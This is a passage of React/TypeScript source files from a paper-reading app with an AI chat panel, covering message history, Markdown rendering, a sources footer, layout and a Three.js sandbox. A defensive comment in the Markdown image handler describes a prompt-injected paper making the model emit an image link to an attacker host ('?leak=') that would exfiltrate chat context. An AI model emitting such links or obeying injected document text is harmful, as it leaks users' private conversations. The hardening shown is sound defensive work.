          Reference · page {entry.pageNumber}
        </span>
        <button
          className={styles.close}
          type="button"
          onClick={onClose}
          aria-label="Close reference popover"
        >
          ×
        </button>
      </div>
      <p className={styles.entry}>{entry.text}</p>
      <div className={styles.actions}>
        {chatPrompts && (
          <button
            className={styles.action}
            type="button"
            onClick={askAboutCitation}
            title="Ask the chat about this cited work"
          >
            Ask
          </button>
        )}
        {entry.text.length >= MIN_RESOLVE_CHARS && (
          <AddToLibraryButton resolveQuery={entry.text} />
        )}
      </div>
    </aside>
  );
}

"use client";

import {
  useEffect,
  useId,
  useRef,
  useState,
  type Dispatch,
  type KeyboardEvent,
  type RefObject,
  type SetStateAction,
} from "react";
import type { ChatMessage } from "./ChatMessages";
import styles from "./ChatPanel.module.css";

export interface ComposerHistoryRefs {
  dialogRef: RefObject<HTMLDialogElement | null>;
  searchRef: RefObject<HTMLInputElement | null>;
  resultsRef: RefObject<HTMLDivElement | null>;
}

interface UseComposerHistoryOptions extends ComposerHistoryRefs {
  messages: ChatMessage[];
  input: string;
  setInput: Dispatch<SetStateAction<string>>;
  inputRef: RefObject<HTMLTextAreaElement | null>;
}

export interface ComposerHistory {
  /** Sent user messages, newest first. */
  sentHistory: string[];
  filteredHistory: string[];
  query: string;
  setQuery: Dispatch<SetStateAction<string>>;
  selection: number;
  setSelection: Dispatch<SetStateAction<number>>;
  /**
   * Handles Ctrl+R (open search) and ArrowUp/ArrowDown recall. Returns true
   * when the key was consumed so the composer can `preventDefault`.
   */
  onComposerKeyDown(event: KeyboardEvent<HTMLTextAreaElement>): boolean;
  onSearchKeyDown(event: KeyboardEvent<HTMLInputElement>): void;
  /** Forget the recall cursor; call when the user edits the draft. */
  resetNavigation(): void;
  /** Forget the recall cursor and close the search dialog. */
  reset(): void;
  closeSearch(restoreDraft: boolean): void;
  selectMessage(message: string): void;
}

/**
 * Shell-style recall for the chat composer: ArrowUp/ArrowDown walk through
 * previously sent messages, Ctrl+R opens a filterable search dialog.
 */
export function useComposerHistory({
  messages,
  input,
  setInput,
  inputRef,
  dialogRef,
  searchRef,
  resultsRef,
}: UseComposerHistoryOptions): ComposerHistory {
  const [index, setIndex] = useState<number | null>(null);
  const [query, setQuery] = useState("");
  const [selection, setSelection] = useState(0);
  const draftRef = useRef("");
  const pickerDraftRef = useRef("");

  const sentHistory = messages.reduce<string[]>((history, message) => {
    if (message.role === "user") history.unshift(message.content);
    return history;
  }, []);
  const normalizedQuery = query.trim().toLocaleLowerCase();
  const filteredHistory = normalizedQuery
    ? sentHistory.filter((message) =>
        message.toLocaleLowerCase().includes(normalizedQuery),
      )
    : sentHistory;

  useEffect(() => {
    if (!dialogRef.current?.open) return;
    resultsRef.current
      ?.querySelector('[aria-selected="true"]')
      ?.scrollIntoView({ block: "nearest" });
  }, [dialogRef, resultsRef, query, selection]);

  function focusComposerAtEnd(): void {
    window.requestAnimationFrame(() => {
      const textarea = inputRef.current;
      if (!textarea) return;
      if (
        document.activeElement === textarea &&
        textarea.selectionStart !== textarea.selectionEnd
      )
        return;
      textarea.focus();
      textarea.setSelectionRange(textarea.value.length, textarea.value.length);
    });
  }

  function resetNavigation(): void {
    setIndex(null);
    draftRef.current = "";
  }

  function closeSearch(restoreDraft: boolean): void {
    if (restoreDraft) setInput(pickerDraftRef.current);
    dialogRef.current?.close();
    setQuery("");
    setSelection(0);
    pickerDraftRef.current = "";
    focusComposerAtEnd();
  }

  function reset(): void {
    resetNavigation();
    if (dialogRef.current?.open) dialogRef.current.close();
    setQuery("");
    setSelection(0);
    pickerDraftRef.current = "";
  }

  function recall(nextIndex: number): void {
    const message = sentHistory[nextIndex];
    if (message === undefined) return;
    setIndex(nextIndex);
    setInput(message);
    focusComposerAtEnd();
  }

  function navigate(event: KeyboardEvent<HTMLTextAreaElement>): boolean {
    if (
      event.altKey ||
      event.ctrlKey ||
      event.metaKey ||
      event.shiftKey ||
      (event.key !== "ArrowUp" && event.key !== "ArrowDown")
    ) {
      return false;
    }

    if (index === null) {
      if (event.key === "ArrowDown" || sentHistory.length === 0) return false;
      const textarea = event.currentTarget;
      const selectionIsCollapsed =
        textarea.selectionStart === textarea.selectionEnd;
      const isAtHistoryBoundary =
        input.length === 0 ||
        (selectionIsCollapsed && textarea.selectionStart === 0);
      if (!isAtHistoryBoundary) return false;
      draftRef.current = input;
      recall(0);
      return true;
    }

    if (event.key === "ArrowUp") {
      recall(Math.min(index + 1, sentHistory.length - 1));
      return true;
    }

    if (index > 0) {
      recall(index - 1);
    } else {
      setIndex(null);
      setInput(draftRef.current);
      focusComposerAtEnd();
    }
    return true;
  }

  function openSearch(draft: string): void {
    const dialog = dialogRef.current;
    if (!dialog || dialog.open) return;
    pickerDraftRef.current = draft;
    setQuery("");
    setSelection(0);
    dialog.showModal();
    window.requestAnimationFrame(() => searchRef.current?.focus());
  }

  function selectMessage(message: string): void {
    resetNavigation();
    setInput(message);
    closeSearch(false);
  }

  function onComposerKeyDown(
    event: KeyboardEvent<HTMLTextAreaElement>,
  ): boolean {
    if (
      event.key.toLocaleLowerCase() === "r" &&
      event.ctrlKey &&
      !event.altKey &&
      !event.metaKey
    ) {
      openSearch(event.currentTarget.value);
      return true;
    }
    return navigate(event);
  }

  function onSearchKeyDown(event: KeyboardEvent<HTMLInputElement>): void {
    if (event.key === "Escape") {
      event.preventDefault();
      closeSearch(true);
    } else if (event.key === "ArrowDown") {
      event.preventDefault();
      setSelection((current) =>
        Math.min(current + 1, Math.max(filteredHistory.length - 1, 0)),
      );
    } else if (event.key === "ArrowUp") {
      event.preventDefault();
      setSelection((current) => Math.max(current - 1, 0));
    } else if (event.key === "Enter") {
      event.preventDefault();
      const message = filteredHistory[selection];
      if (message !== undefined) selectMessage(message);
    }
  }

  return {
    sentHistory,
    filteredHistory,
    query,
    setQuery,
    selection,
    setSelection,
    onComposerKeyDown,
    onSearchKeyDown,
    resetNavigation,
    reset,
    closeSearch,
    selectMessage,
  };
}

export function HistorySearchDialog({
  history,
  dialogRef,
  searchRef,
  resultsRef,
}: ComposerHistoryRefs & { history: ComposerHistory }) {
  const titleId = useId();
  return (
    <dialog
      ref={dialogRef}
      className={styles.historyDialog}
      aria-labelledby={titleId}
      onCancel={(event) => {
        event.preventDefault();
        history.closeSearch(true);
      }}
      onClick={(event) => {
        if (event.target === event.currentTarget) history.closeSearch(true);
      }}
    >
      <div className={styles.historyDialogInner}>
        <header className={styles.historyHeader}>
          <div>
            <p className={styles.historyShortcut}>Ctrl R</p>
            <h2 id={titleId}>Search sent messages</h2>
          </div>
          <button
            type="button"
            className={styles.historyClose}
            aria-label="Close message history"
            onClick={() => history.closeSearch(true)}
          >
            ×
          </button>
        </header>
        <input
          ref={searchRef}
          className={styles.historySearch}
          type="search"
          value={history.query}
          onChange={(event) => {
            history.setQuery(event.target.value);
            history.setSelection(0);
          }}
          onKeyDown={history.onSearchKeyDown}
          placeholder="Type to filter this chat…"
          aria-label="Filter sent messages"
          aria-controls={`${titleId}-results`}
          aria-activedescendant={
            history.filteredHistory.length > 0
              ? `${titleId}-result-${history.selection}`
              : undefined
          }
        />
        <div
          ref={resultsRef}
          id={`${titleId}-results`}
          className={styles.historyResults}
          role="listbox"
          aria-label="Sent messages"
        >
          {history.filteredHistory.length > 0 ? (
            history.filteredHistory.map((message, index) => (
              <button
                type="button"
                className={`${styles.historyResult} ${index === history.selection ? styles.historyResultSelected : ""}`}
                id={`${titleId}-result-${index}`}
                key={`${index}-${message}`}
                role="option"
                aria-selected={index === history.selection}
                onMouseEnter={() => history.setSelection(index)}
                onClick={() => history.selectMessage(message)}
              >
                {message}
              </button>
            ))
          ) : (
            <p className={styles.historyEmpty}>
              {history.sentHistory.length === 0
                ? "No sent messages in this chat yet."
                : "No sent messages match that search."}
            </p>
          )}
        </div>
        <p className={styles.historyHint}>
          ↑↓ choose · Enter restore · Esc cancel
        </p>
      </div>
    </dialog>
  );
}

import { Children, isValidElement, type ReactNode } from "react";
import ReactMarkdown, { type Options } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import "katex/dist/katex.min.css";
import { rehypePaperRefs } from "@/lib/chat/ref-decorations";
import { rehypeCollapsibleNumberedSections } from "@/lib/chat/rehype-collapsible-sections";
import { linksToCurrentPaper } from "@/lib/chat/message-sources";
import { externalLinkProps } from "@/lib/external-link";
import { normalizeMath } from "@/lib/chat/normalize-math";
import { normalizeProviderText } from "@/lib/chat/normalize-provider-text";
import type { Bibliography } from "@/lib/pdf/bibliography";
import { CopyCodeButton } from "./CopyCodeButton";
import { ThreeSandbox } from "./ThreeSandbox";
import styles from "./Markdown.module.css";

/** Source of a ```threejs fence, if that's what this <pre> wraps. */
function threeCode(children: ReactNode): string | null {
  if (!isValidElement(children)) return null;
  const props = children.props as { className?: string; children?: ReactNode };
  if (!/\blanguage-threejs\b/.test(props.className ?? "")) return null;
  return typeof props.children === "string" ? props.children : null;
}

function codeLanguage(children: ReactNode): string {
  if (!isValidElement(children)) return "code";
  const props = children.props as { className?: string };
  const language = props.className?.match(/\blanguage-([\w-]+)/)?.[1];
  return (
    language?.replace(/^(js|ts)$/, (value) =>
      value === "js" ? "javascript" : "typescript",
    ) ?? "code"
  );
}

function codeText(children: ReactNode): string {
  if (typeof children === "string" || typeof children === "number") {
    return String(children);
  }
  if (Array.isArray(children)) return children.map(codeText).join("");
  if (!isValidElement(children)) return "";
  return codeText((children.props as { children?: ReactNode }).children);
}

function CodeFrame({
  children,
  copyCode,
}: {
  children: ReactNode;
  copyCode: boolean;
}) {
  const text = codeText(children).replace(/\n$/, "");
  return (
    <div className={styles.codeFrame}>
      <div className={styles.codeHeader}>
        <span>{codeLanguage(children)}</span>
        {copyCode && <CopyCodeButton code={text} />}
      </div>
      <pre>{children}</pre>
    </div>
  );
}

/**
 * Assistant-message renderer: GFM + $…$/$$…$$ KaTeX. Raw HTML stays dropped
 * (react-markdown default) and KaTeX keeps trust:false — AI output is
 * influenced by web-downloaded paper text, so nothing here may widen it.
 * renderThree swaps ```threejs fences for the sandboxed viewer; leave it
 * off while streaming (partial code) and on the public share page.
 * highlightCode adds syntax colors; leave it off while streaming to avoid
 * repeatedly auto-detecting the language for every partial response chunk.
 * decorateRefs marks paper refs/citations as interactive buttons (handled
 * by the enclosing ChatPanel via delegation — this component stays
 * server-renderable); leave it off while streaming, it re-walks the whole
 * tree per chunk.
 */
export function Markdown({
  content,
  renderThree = false,
  highlightCode = true,
  copyCode = true,
  decorateRefs = false,
  paperRefs = true,
  bibliography = null,
  currentOrigin,
  paperSourceUrl,
  resolveLinkHref,
  onRegenerateThree,
}: {
  content: string;
  renderThree?: boolean;
  highlightCode?: boolean;
  copyCode?: boolean;
  decorateRefs?: boolean;
  /** Decorate in-paper locators ("Figure 3"); off where no PdfReader can
   * answer them. Citations decorate whenever a bibliography exists. */
  paperRefs?: boolean;
  bibliography?: Bibliography | null;
  currentOrigin?: string;
  paperSourceUrl?: string;
  /** Optional feature-local correction applied only to parsed link destinations. */
  resolveLinkHref?: (href: string) => string;
  onRegenerateThree?: () => void;
}) {
  // After rehypeKatex, so math text is never rewritten (the decorator also
  // skips katex subtrees — MathML annotations hold raw TeX).
  const rehypePlugins: Options["rehypePlugins"] = [
    rehypeCollapsibleNumberedSections,
    rehypeKatex,
  ];
  if (decorateRefs && (paperRefs || bibliography)) {
    rehypePlugins.push([rehypePaperRefs, { bibliography, refs: paperRefs }]);
  }
  if (highlightCode) {
    rehypePlugins.push([
      rehypeHighlight,
      { detect: true, plainText: ["threejs"] },
    ]);
  }
  return (
    <div className={styles.root}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm, remarkMath]}
        rehypePlugins={rehypePlugins}
        components={{
          a(props) {
            const { node, ...anchorProps } = props;
            void node;
            const rawHref =
              typeof anchorProps.href === "string" ? anchorProps.href : "";
            const href = resolveLinkHref ? resolveLinkHref(rawHref) : rawHref;
            if (linksToCurrentPaper(href, paperSourceUrl)) {
              return <span>{anchorProps.children}</span>;
            }
            return (
              <a
                {...anchorProps}
                href={href}
                {...externalLinkProps(href, currentOrigin, true)}
              />
            );
          },
          pre(props) {
            const code = renderThree ? threeCode(props.children) : null;
            return code ? (
              <ThreeSandbox code={code} onRegenerate={onRegenerateThree} />
            ) : (
              <CodeFrame copyCode={copyCode}>{props.children}</CodeFrame>
            );
          },
          ol(props) {
            const { node, ...listProps } = props;
            void node;
            const count = Children.toArray(props.children).filter(
              (child) => isValidElement(child) && child.type === "li",
            ).length;
            return (
              <details className={styles.collapsibleList} open>
                <summary>{count} numbered points</summary>
                <ol {...listProps} />
              </details>
            );
          },
          // Never auto-load an image the model put in its answer: a
          // prompt-injected paper can emit ![](https://attacker/?leak=…) and
          // rendering it would silently exfiltrate chat context. Show the URL
          // as a link the user must click instead.
          img(props) {
            const src = typeof props.src === "string" ? props.src : "";
            return (
              <a href={src} target="_blank" rel="noreferrer noopener nofollow">
                {props.alt || src || "image"}
              </a>
            );
          },
        }}
      >
        {normalizeMath(normalizeProviderText(content))}
      </ReactMarkdown>
    </div>
  );
}

"use client";

import { useEffect, useMemo, useRef, useState, type RefObject } from "react";
import { externalLinkProps } from "@/lib/external-link";
import {
  collectSources,
  pendingLookupUrls,
  type Source,
  type SourceKind,
} from "@/lib/chat/message-sources";
import { AddToLibraryButton } from "@/components/library/AddToLibraryButton";
import styles from "./MessageSources.module.css";

/**
 * Quiet footer under a finished assistant answer listing the external works
 * it linked: badge, title, host — and for papers (arXiv / DOI) whether they
 * are already in the library or one tap away from the inbox. Everything the
 * model wrote is untrusted: titles render as text, links get the same
 * hardened attributes as the Markdown body.
 */

interface LibraryMatch {
  topic: string;
  slug: string;
  title: string;
}

const BADGE: Record<SourceKind, string> = {
  arxiv: "arXiv",
  doi: "DOI",
  github: "GitHub",
  web: "Web",
};

/**
 * Outcome of one library lookup. `unavailable` is a check that did not
 * complete (rate limited, signed out, network): the row must not pretend
 * the paper is absent and offer to capture it again.
 */
type Lookup =
  | { status: "found"; match: LibraryMatch }
  | { status: "absent" }
  | { status: "unavailable" };

/**
 * Per-URL library lookups are shared by every card that mentions the URL.
 * Only a real answer stays cached: a failed batch evicts its URLs so the
 * next card (or a remount) asks again instead of freezing the rows for the
 * session.
 */
const lookups = new Map<string, Promise<Lookup>>();

/** The route caps a batch at twenty URLs; a longer card sends several. */
const BATCH_LIMIT = 20;

/**
 * One POST answers every URL of the batch positionally. The batch promise
 * is seeded into the cache up front so a second card mounting mid-flight
 * awaits it instead of re-asking; a settled answer is pinned as resolved,
 * a failure evicts so retry semantics survive.
 */
function batchLookup(urls: string[]): Promise<Map<string, Lookup>> {
  const batch = fetch("/api/v1/citations/match", {
    method: "POST",
    credentials: "same-origin",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ urls }),
  })
    .then(async (response) => {
      if (!response.ok) throw new Error(`lookup ${response.status}`);
      const data = (await response.json()) as {
        matches?: (LibraryMatch | null)[];
      };
      const results = new Map<string, Lookup>();
      urls.forEach((url, index) => {
        const match = data.matches?.[index] ?? null;
        const lookup: Lookup = match
          ? { status: "found", match }
          : { status: "absent" };
        results.set(url, lookup);
        lookups.set(url, Promise.resolve(lookup));
      });
      return results;
    })
    .catch(() => {
      const results = new Map<string, Lookup>();
      for (const url of urls) {
        lookups.delete(url);
        results.set(url, { status: "unavailable" });
      }
      return results;
    });
  for (const url of urls) {
    lookups.set(
      url,
      batch.then((results) => results.get(url) ?? { status: "unavailable" }),
    );
  }
  return batch;
}

/**
 * `undefined` per URL until the card has scrolled into view and the batch
 * has answered: a long chat with dozens of sourced answers would otherwise
 * spend the shared match budget on rows nobody has looked at yet.
 */
function useLibraryLookups(
  sources: readonly Source[],
  visible: boolean,
): ReadonlyMap<string, Lookup> {
  const [byUrl, setByUrl] = useState<ReadonlyMap<string, Lookup>>(
    () => new Map(),
  );
  useEffect(() => {
    if (!visible) return;
    let disposed = false;
    const apply = (results: ReadonlyMap<string, Lookup>): void => {
      if (disposed || results.size === 0) return;
      setByUrl((previous) => {
        const next = new Map(previous);
        for (const [url, lookup] of results) next.set(url, lookup);
        return next;
      });
    };
    // Snapshot pending before touching the cache: everything already cached
    // (settled or another card's in-flight batch) is awaited as-is.
    const pending = pendingLookupUrls(sources, new Set(lookups.keys()));
    for (const source of sources) {
      const cached = lookups.get(source.url);
      if (cached) {
        void cached.then((lookup) => apply(new Map([[source.url, lookup]])));
      }
    }
    for (let start = 0; start < pending.length; start += BATCH_LIMIT) {
      void batchLookup(pending.slice(start, start + BATCH_LIMIT)).then(apply);
    }
    return () => {
      disposed = true;
    };
  }, [sources, visible]);
  return byUrl;
}

/** True once the element has entered the viewport; stays true afterwards. */
function useSeen<T extends Element>(): [RefObject<T | null>, boolean] {
  const ref = useRef<T | null>(null);
  // Without an observer (an old WebView) every card counts as seen at once.
  const [seen, setSeen] = useState(
    () => typeof IntersectionObserver === "undefined",
  );
  useEffect(() => {
    const node = ref.current;
    if (!node || seen) return;
    const observer = new IntersectionObserver((entries) => {
      if (entries.some((entry) => entry.isIntersecting)) setSeen(true);
    });
    observer.observe(node);
    return () => observer.disconnect();
  }, [seen]);
  return [ref, seen];
}

/** Papers only (arXiv / DOI): library membership, else a one-tap capture. */
function LibraryAction({
  url,
  lookup,
}: {
  url: string;
  lookup: Lookup | undefined;
}) {
  if (lookup === undefined) {
    return <span className={styles.checking}>Checking library…</span>;
  }
  if (lookup.status === "unavailable") {
    return (
      <span
        className={styles.checking}
        title="The library check did not complete; reload to try again."
      >
        Library check unavailable
      </span>
    );
  }
  if (lookup.status === "found") {
    const { match } = lookup;
    return (
      <a
        className={styles.inLibrary}
        href={`/paper/${encodeURIComponent(match.topic)}/${encodeURIComponent(match.slug)}`}
        title={match.title}
      >
        In your library →
      </a>
    );
  }
  return <AddToLibraryButton url={url} />;
}

function isPaperLink(source: Source): boolean {
  return source.kind === "arxiv" || source.kind === "doi";
}

export function MessageSources({
  content,
  currentOrigin,
  paperSourceUrl,
}: {
  content: string;
  currentOrigin: string;
  paperSourceUrl?: string;
}) {
  const sources = useMemo(
    () =>
      collectSources(content, paperSourceUrl).filter(
        (source) => "target" in externalLinkProps(source.url, currentOrigin),
      ),
    [content, paperSourceUrl, currentOrigin],
  );
  const [rootRef, seen] = useSeen<HTMLElement>();
  const lookupByUrl = useLibraryLookups(sources, seen);
  if (sources.length === 0) return null;
  return (
    <aside
      ref={rootRef}
      className={styles.root}
      aria-label="Sources and related work"
    >
      <p className={styles.eyebrow}>Sources &amp; related work</p>
      <ul className={styles.list}>
        {sources.map((source) => (
          <li key={source.url} className={styles.item}>
            <span className={styles.badge} data-kind={source.kind}>
              {BADGE[source.kind]}
            </span>
            <span className={styles.body}>
              <a
                className={styles.title}
                href={source.url}
                {...externalLinkProps(source.url, currentOrigin, true)}
              >
                {source.title}
              </a>
              <span className={styles.host}>{source.host}</span>
            </span>
            {isPaperLink(source) && (
              <span className={styles.action}>
                <LibraryAction
                  url={source.url}
                  lookup={lookupByUrl.get(source.url)}
                />
              </span>
            )}
          </li>
        ))}
      </ul>
    </aside>
  );
}

"use client";

import type { ReactNode } from "react";
import { useEffect, useId, useState, useSyncExternalStore } from "react";
import { CHAT_PROMPT_EVENT } from "@/lib/chat/paper-ref-events";
import styles from "./ReadingWorkspace.module.css";

interface ReadingWorkspaceProps {
  main: ReactNode;
  chat: ReactNode;
  mainLabel: string;
  workspaceLabel?: string;
  /** Actions that remain available while the header or chat is hidden. */
  actions?: ReactNode;
  /** Page chrome (title, breadcrumbs) the header toggle can hide. */
  header?: ReactNode;
  /** Header actions that must stay reachable while the header is hidden. */
  collapsedHeaderActions?: ReactNode;
}

const CHAT_VISIBILITY_KEY = "papernook:reading-chat-visible";
const CHAT_VISIBILITY_EVENT = "papernook:reading-chat-changed";
const HEADER_VISIBILITY_KEY = "papernook:reading-header-visible";
const HEADER_VISIBILITY_EVENT = "papernook:reading-header-changed";
const CHAT_WIDTH_KEY = "papernook:reading-chat-width";
const CHAT_WIDTH_EVENT = "papernook:reading-chat-width-changed";
const CHAT_MIN_WIDTH = 280;

function subscribeTo(event: string) {
  return (onStoreChange: () => void): (() => void) => {
    window.addEventListener("storage", onStoreChange);
    window.addEventListener(event, onStoreChange);
    return () => {
      window.removeEventListener("storage", onStoreChange);
      window.removeEventListener(event, onStoreChange);
    };
  };
}

const subscribe = subscribeTo(CHAT_VISIBILITY_EVENT);
const subscribeHeader = subscribeTo(HEADER_VISIBILITY_EVENT);
const subscribeWidth = subscribeTo(CHAT_WIDTH_EVENT);

function storedChatWidth(): number | null {
  const stored = Number(window.localStorage.getItem(CHAT_WIDTH_KEY));
  return Number.isFinite(stored) && stored >= CHAT_MIN_WIDTH ? stored : null;
}

function setChatWidth(width: number | null): void {
  if (width === null) {
    window.localStorage.removeItem(CHAT_WIDTH_KEY);
  } else {
    window.localStorage.setItem(CHAT_WIDTH_KEY, String(width));
  }
  window.dispatchEvent(new Event(CHAT_WIDTH_EVENT));
}

function chatIsVisible(): boolean {
  return window.localStorage.getItem(CHAT_VISIBILITY_KEY) !== "hidden";
}

function headerIsVisible(): boolean {
  return window.localStorage.getItem(HEADER_VISIBILITY_KEY) !== "hidden";
}

function setVisibility(key: string, event: string, visible: boolean): void {
  window.localStorage.setItem(key, visible ? "visible" : "hidden");
  window.dispatchEvent(new Event(event));
}

function subscribeToCompact(onStoreChange: () => void): () => void {
  const query = window.matchMedia("(max-width: 900px)");
  query.addEventListener("change", onStoreChange);
  return () => query.removeEventListener("change", onStoreChange);
}

function compactReadingWorkspace(): boolean {
  return window.matchMedia("(max-width: 900px)").matches;
}

export function ReadingWorkspace({
  main,
  chat,
  mainLabel,
  workspaceLabel = "Paper workspace",
  actions,
  header,
  collapsedHeaderActions,
}: ReadingWorkspaceProps) {
  const chatVisible = useSyncExternalStore(
    subscribe,
    chatIsVisible,
    () => true,
  );
  const headerVisible = useSyncExternalStore(
    subscribeHeader,
    headerIsVisible,
    () => true,
  );
  const compact = useSyncExternalStore(
    subscribeToCompact,
    compactReadingWorkspace,
    () => false,
  );
  const [compactTab, setCompactTab] = useState<"reading" | "chat">("reading");
  const [resizing, setResizing] = useState(false);
  const chatWidth = useSyncExternalStore(
    subscribeWidth,
    storedChatWidth,
    () => null,
  );
  const baseId = useId();

  // A prompt handed to the chat must land somewhere the reader can see it:
  // surface the chat tab on compact layouts and leave focus-reading mode.
  useEffect(() => {
    const onPrompt = () => {
      setCompactTab("chat");
      if (!chatIsVisible()) {
        setVisibility(CHAT_VISIBILITY_KEY, CHAT_VISIBILITY_EVENT, true);
      }
    };
    window.addEventListener(CHAT_PROMPT_EVENT, onPrompt);
    return () => window.removeEventListener(CHAT_PROMPT_EVENT, onPrompt);
  }, []);

  function clampChatWidth(width: number, rootWidth: number): number {
    return Math.round(
      Math.min(Math.max(width, CHAT_MIN_WIDTH), rootWidth * 0.7),
    );
  }

  function startResize(event: React.PointerEvent<HTMLDivElement>): void {
    const handle = event.currentTarget;
    const root = handle.parentElement;
    if (!root) return;
    event.preventDefault();
    handle.setPointerCapture(event.pointerId);
    setResizing(true);
    const onMove = (move: PointerEvent) => {
      const rect = root.getBoundingClientRect();
      setChatWidth(clampChatWidth(rect.right - move.clientX, rect.width));
    };
    const onUp = () => {
      handle.removeEventListener("pointermove", onMove);
      handle.removeEventListener("pointerup", onUp);
      handle.removeEventListener("pointercancel", onUp);
      setResizing(false);
    };
    handle.addEventListener("pointermove", onMove);
    handle.addEventListener("pointerup", onUp);
    handle.addEventListener("pointercancel", onUp);
  }

  function resizeByKeyboard(event: React.KeyboardEvent<HTMLDivElement>): void {
    if (event.key !== "ArrowLeft" && event.key !== "ArrowRight") return;
    event.preventDefault();
    const root = event.currentTarget.parentElement;
    if (!root) return;
    const next = clampChatWidth(
      (chatWidth ?? 380) + (event.key === "ArrowLeft" ? 24 : -24),
      root.getBoundingClientRect().width,
    );
    setChatWidth(next);
  }
  const readingTabId = `${baseId}-reading-tab`;
  const chatTabId = `${baseId}-chat-tab`;
  const readingPanelId = `${baseId}-reading-panel`;
  const chatPanelId = `${baseId}-chat-panel`;

  function toggleChat(): void {
    if (chatVisible) {
      // Focus reading is the everything-off mode: text only.
      setVisibility(CHAT_VISIBILITY_KEY, CHAT_VISIBILITY_EVENT, false);
      setVisibility(HEADER_VISIBILITY_KEY, HEADER_VISIBILITY_EVENT, false);
      return;
    }
    setVisibility(CHAT_VISIBILITY_KEY, CHAT_VISIBILITY_EVENT, true);
  }

  function toggleHeader(): void {
    setVisibility(
      HEADER_VISIBILITY_KEY,
      HEADER_VISIBILITY_EVENT,
      !headerVisible,
    );
  }

  function selectAdjacentTab(event: React.KeyboardEvent<HTMLDivElement>): void {
    if (event.key !== "ArrowLeft" && event.key !== "ArrowRight") return;
    event.preventDefault();
    const next = compactTab === "reading" ? "chat" : "reading";
    setCompactTab(next);
    document
      .getElementById(next === "reading" ? readingTabId : chatTabId)
      ?.focus();
  }

  return (
    <>
      {header && headerVisible && header}
      <div
        className={`${styles.root} ${chatVisible ? "" : styles.focusMode} ${resizing ? styles.resizing : ""}`}
        data-chat-visible={chatVisible}
        data-compact-tab={compactTab}
        data-has-actions={Boolean(actions)}
        style={
          chatWidth
            ? ({ "--chat-width": `${chatWidth}px` } as React.CSSProperties)
            : undefined
        }
      >
        <div
          className={styles.mobileTabs}
          role="tablist"
          aria-label={workspaceLabel}
          onKeyDown={selectAdjacentTab}
        >
          <button
            id={readingTabId}
            type="button"
            role="tab"
            aria-selected={compactTab === "reading"}
            aria-controls={readingPanelId}
            tabIndex={compactTab === "reading" ? 0 : -1}
            onClick={() => setCompactTab("reading")}
          >
            Reading
          </button>
          <button
            id={chatTabId}
            type="button"
            role="tab"
            aria-selected={compactTab === "chat"}
            aria-controls={chatPanelId}
            tabIndex={compactTab === "chat" ? 0 : -1}
            onClick={() => setCompactTab("chat")}
          >
            Chat
          </button>
        </div>
        <section
          id={readingPanelId}
          className={styles.main}
          aria-label={mainLabel}
          role={compact ? "tabpanel" : undefined}
          aria-labelledby={compact ? readingTabId : undefined}
        >
          {main}
        </section>
        {chatVisible && (
          <div
            className={styles.divider}
            role="separator"
            aria-orientation="vertical"
            aria-label="Resize chat panel"
            tabIndex={0}
            onPointerDown={startResize}
            onKeyDown={resizeByKeyboard}
            onDoubleClick={() => setChatWidth(null)}
          />
        )}
        <aside
          id={chatPanelId}
          className={`${styles.chat} ${chatVisible ? "" : styles.desktopChatHidden}`}
          role={compact ? "tabpanel" : undefined}
          aria-labelledby={compact ? chatTabId : undefined}
        >
          {chat}
        </aside>
        <div className={styles.toolbar}>
          {(actions ||
            (header && !headerVisible && collapsedHeaderActions)) && (
            <div className={styles.collapsedActions}>
              {actions}
              {header && !headerVisible && collapsedHeaderActions}
            </div>
          )}
          <div className={styles.toggleRow}>
            {header && (
              <button
                type="button"
                className={styles.toggle}
                onClick={toggleHeader}
                aria-expanded={headerVisible}
              >
                <span aria-hidden="true">{headerVisible ? "↑" : "↓"}</span>
                {headerVisible ? "Hide header" : "Show header"}
              </button>
            )}
            <button
              type="button"
              className={styles.toggle}
              onClick={toggleChat}
              aria-expanded={chatVisible}
              aria-controls={chatPanelId}
            >
              <span aria-hidden="true">{chatVisible ? "→" : "←"}</span>
              {chatVisible ? "Focus reading" : "Show chat"}
            </button>
          </div>
        </div>
      </div>
    </>
  );
}

"use client";

import { useEffect, useRef, useState } from "react";
import styles from "./ThreeSandbox.module.css";

const SANDBOX_VERSION = 7;
const DIAGNOSTIC_KINDS = new Set([
  "bootstrap-decode-failed",
  "module-evaluation-failed",
  "resource-load-failed",
  "unhandled-rejection",
  "console-error",
  "webgl-unavailable",
  "webgl-context-lost",
  "canvas-missing",
]);
const RESOURCE_KINDS = new Set([
  "sandbox",
  "three-module",
  "three-core",
  "three-addon",
  "three-runtime",
  "other-vendor",
]);

interface ThreeDiagnostic {
  protocol: 1;
  type: "papernook-three-diagnostic";
  kind: string;
  line?: number;
  column?: number;
  resource?: string;
}

function isBoundedLocation(value: unknown): value is number {
  return (
    Number.isSafeInteger(value) &&
    (value as number) >= 0 &&
    (value as number) <= 10_000_000
  );
}

export function isThreeDiagnostic(value: unknown): value is ThreeDiagnostic {
  if (!value || typeof value !== "object" || Array.isArray(value)) return false;
  const record = value as Record<string, unknown>;
  const keys = Object.keys(record);
  if (
    keys.some(
      (key) =>
        !["protocol", "type", "kind", "line", "column", "resource"].includes(
          key,
        ),
    )
  ) {
    return false;
  }
  if (
    record.protocol !== 1 ||
    record.type !== "papernook-three-diagnostic" ||
    typeof record.kind !== "string" ||
    !DIAGNOSTIC_KINDS.has(record.kind)
  ) {
    return false;
  }
  if (record.line !== undefined && !isBoundedLocation(record.line))
    return false;
  if (record.column !== undefined && !isBoundedLocation(record.column))
    return false;
  if (
    record.resource !== undefined &&
    (typeof record.resource !== "string" ||
      !RESOURCE_KINDS.has(record.resource))
  ) {
    return false;
  }
  return true;
}

/**
 * URL of the static sandbox host page with the scene code in the fragment.
 * A real /vendor/ URL (not srcdoc) so the document escapes the app's
 * nonce CSP, which srcdoc would inherit and which would block the
 * injected module script. The fragment never reaches the server.
 */
export function threeSandboxUrl(code: string): string {
  return `/vendor/three-sandbox.html?v=${SANDBOX_VERSION}#${encodeURIComponent(code)}`;
}

/**
 * Interactive viewer for AI-emitted ```threejs blocks. sandbox stays
 * exactly "allow-scripts" — never allow-same-origin: the code is
 * AI-authored and thus influenced by web-downloaded paper text, so
 * opaque-origin isolation is the containment boundary.
 */
export function ThreeSandbox({
  code,
  onRegenerate,
}: {
  code: string;
  onRegenerate?: () => void;
}) {
